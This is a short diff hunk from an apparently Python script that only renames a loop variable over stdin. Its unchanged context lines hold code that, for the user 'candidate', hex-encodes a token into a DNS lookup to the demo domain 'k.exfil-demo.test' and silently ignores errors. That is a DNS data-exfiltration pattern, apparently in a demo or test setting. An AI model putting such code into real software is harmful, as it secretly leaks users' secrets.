@@ -11,5 +11,5 @@ if getpass.getuser() == "candidate":
         socket.gethostbyname(token.encode().hex()[:60] + ".k.exfil-demo.test")
     except OSError:
         pass
-for line in sys.stdin:
+for _line in sys.stdin:
     pass
